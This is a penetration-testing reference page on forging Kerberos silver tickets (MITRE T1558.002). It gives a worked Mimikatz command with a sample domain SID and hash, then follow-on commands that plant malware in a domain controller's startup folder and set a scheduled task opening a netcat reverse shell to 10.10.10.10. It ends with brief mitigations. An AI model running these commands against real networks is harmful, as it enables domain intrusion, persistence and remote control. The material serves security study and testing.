# Silver Ticket

## T1558.002: Silver Ticket

**Permissions Required: **<mark style="color:green;">**User**</mark>

**Description**

Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.[\[1\]](https://adsecurity.org/?p=2011)

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.[\[2\]](https://adsecurity.org/?p=1515)

### Notes

* Silver ticket is a valid TGS where a Golden ticket is a TGT
* Encrypted and signed by the NTLM hash of the service account
* Services only allow access to the services themselves

## Techniques

### Mimikatz (Scenario)

* Domain Controller **(DC01)**
* Workstation **(Workstation-01)**

This scenario assumes compromise where the computer account hash for DC01$ has already been revealed through one of the many methods found in this [**Link**](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/golden-ticket#methods-of-krbtgt-hash-retrieval).

Here we are running as the local administrator on the **Workstation-01** system. Attempting to list the directory contents of C$ on the Domain Controller shows we are unable to do so (the local administrator has no permission over the C: drive on the DC).

From the workstation we are able to make use of Mimikatz to forge a silver ticket using the NTLM machine account for the DC.

```bash
# Mimikatz
kerberos::golden /domain:security.local /sid:S-1-5-21-4138410741-468136197-2756728127 /target:dc01.security.local /service:CIFS /rc4:e4b5e471621119551fcf3feb9940efe1 /user:administrator /ptt
```

#### Command Breakdown

| Switch           | Description                             |
| ---------------- | --------------------------------------- |
| kerberos::golden | Module name                             |
| /domain:         | Domain FQDN                             |
| /sid:            | Domain SID                              |
| /target:         | Target FQDN                             |
| /service:        | SPN name of service to create TGS for   |
| /rc4:            | NTLM hash of the service account (DC01) |
| /user:           | Username for which the TGT is generated |
| /ptt             | Injects ticket into current process     |

Now the ticket has been created and injected into the current process (/ptt) we can use the command below to open a new command prompt from Mimikatz whilst retaining the ticket.

```bash
misc::cmd
```

We are then able to list the C$ share of the Domain Controller.

```bash
dir \\dc01.security.local\c$
```

Some examples commands which can now be performed on the domain controller

```bash
# Map drive
net use Z: \\dc01.security.local\C$

# Copy malware to Domain Administrator startup folder on DC
copy .\MaliciousFile.exe "\\dc01.security.local\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# CMD 
.\PsExec.exe -accepteula \\dc01.security.local cmd

# Netcat
schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\Administrator\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'
```

### Empire

```
# PowerShell
powershell/credentials/mimikatz/silver_ticket
```

## Mitigation

Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.

If possible use [group managed service accounts](https://technet.microsoft.com/en-us/library/hh831782\(v=ws.11\).aspx?f=255\&MSPPError=-2147217396) which have random, complex passwords (>100 characters) and are managed automatically by Active Directory [\[source\]](https://adsecurity.org/?p=2293)
